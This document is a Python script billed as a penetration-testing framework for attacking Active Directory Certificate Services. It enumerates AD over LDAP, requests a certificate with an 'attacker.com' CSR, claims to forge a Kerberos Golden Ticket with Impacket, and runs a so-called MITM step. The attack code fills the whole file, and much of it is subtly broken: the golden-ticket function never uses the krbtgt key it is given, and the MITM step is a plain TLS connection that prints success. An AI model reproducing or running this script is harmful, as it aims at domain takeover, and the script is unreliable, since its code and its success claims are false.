######################################################################################################################################################################################################################
# A Cert Python script Penetration Testing & Ethical Hacking Framework, Note: Be mindful of the scope of work, & rules of engagement. 
# This software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import ldap3
import requests
from cryptography import x509
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from impacket.krb5.kerberosv5 import encodeTicket, getKerberosTGT
import socket
import ssl

# 1. Enumerate AD Certificate Templates
def enumerate_cert_templates(ad_server, domain, username, password):
    """
    Enumerate certificate templates from Active Directory.
    """
    server = ldap3.Server(ad_server)
    conn = ldap3.Connection(server, user=f'{domain}\\{username}', password=password, auto_bind=True)

    # Search filter to find the ADCS certificate templates
    search_filter = "(objectClass=pKIEnrollmentService)"
    base_dn = "CN=Configuration,DC=domain,DC=com"
    
    conn.search(base_dn, search_filter, attributes=['pKIEnrollmentService'])
    
    templates = []
    for entry in conn.entries:
        templates.append(entry.pKIEnrollmentService.value)

    conn.unbind()
    return templates

# 2. Generate CSR for requesting certificates
def generate_csr(common_name="attacker.com"):
    """
    Generate a Certificate Signing Request (CSR) for ADCS.
    """
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, common_name)])

    csr = x509.CertificateSigningRequestBuilder().subject_name(subject).sign(private_key, hashes.SHA256())
    return csr.public_bytes(serialization.Encoding.PEM), private_key

# 3. Request Certificate from ADCS
def request_certificate_from_adcs(adcs_url, csr_pem):
    """
    Send CSR to ADCS server and receive signed certificate.
    """
    headers = {'Content-Type': 'application/pkcs10'}

    response = requests.post(adcs_url, data=csr_pem, headers=headers)
    
    if response.status_code == 200:
        signed_cert = x509.load_pem_x509_certificate(response.content)
        print("[+] Successfully obtained certificate from ADCS!")
        return signed_cert
    else:
        print("[-] Failed to request certificate")
        return None

# 4. Kerberos Golden Ticket Creation Using Impacket
def create_golden_ticket(domain, tgt_key, user="admin", domain_admin_password="password"):
    """
    Create a Golden Ticket for Kerberos using Impacket's tools.
    """
    # Target domain and user details
    domain = domain.upper()
    user = user.lower()
    
    # Get Kerberos TGT (Ticket Granting Ticket) from Impacket
    print(f"[+] Fetching TGT for {user}@{domain}...")
    tgt = getKerberosTGT(domain, user, domain_admin_password)
    
    # Now forge the Golden Ticket using Impacket's encodeTicket
    print(f"[+] Creating Golden Ticket for user {user}@{domain}...")
    golden_ticket = encodeTicket(tgt, domain, user)
    
    # The golden_ticket can be saved or used here for further actions
    print(f"[+] Golden Ticket Created:\n{golden_ticket}")
    
    return golden_ticket

# 5. MITM Attack Simulation with the Certificate
def mitm_attack_with_cert(cert_path, key_path, target_host):
    """
    Simulate a MITM attack using the generated certificate.
    """
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=cert_path, keyfile=key_path)

    try:
        with socket.create_connection((target_host, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                print(f"[+] MITM attack successful with {target_host}.")
                print(f"SSL Version: {ssock.version()}")
    except Exception as e:
        print(f"[-] Failed to establish SSL connection: {e}")

# Main function to execute everything
def main():
    # AD Server details and user credentials
    ad_server = "your_ad_server"
    domain = "your_domain"
    username = "your_username"
    password = "your_password"
    adcs_url = "https://your_adcs_url"

    # Step 1: Enumerate AD Certificate Templates
    print("[*] Enumerating AD Certificate Templates...")
    templates = enumerate_cert_templates(ad_server, domain, username, password)
    print(f"Available Templates: {templates}")
    
    # Step 2: Generate CSR (Certificate Signing Request)
    print("[*] Generating CSR...")
    csr_pem, private_key = generate_csr()
    
    # Step 3: Request Certificate from ADCS
    print("[*] Requesting Certificate from ADCS...")
    signed_cert = request_certificate_from_adcs(adcs_url, csr_pem)
    
    if signed_cert:
        # Step 4: Create Golden Ticket (Kerberos Ticket)
        print("[*] Creating Golden Ticket...")
        tgt_key = b"YourTGTKeyHere"  # Replace with actual TGT Key (KRBTGT hash)
        golden_ticket = create_golden_ticket(domain, tgt_key)

        # Now the Golden Ticket can be used in a Kerberos authentication flow or service ticket request
        print(f"[*] Golden Ticket Ready for Use: {golden_ticket}")
        
        # You can also save or inject this Golden Ticket into Kerberos requests.
        
        # Step 5: Simulate MITM Attack
        print("[*] Simulating MITM Attack...")
        cert_path = "path_to_your_certificate.pem"
        key_path = "path_to_your_private_key.pem"
        mitm_attack_with_cert(cert_path, key_path, "target_host.com")

if __name__ == "__main__":
    main()
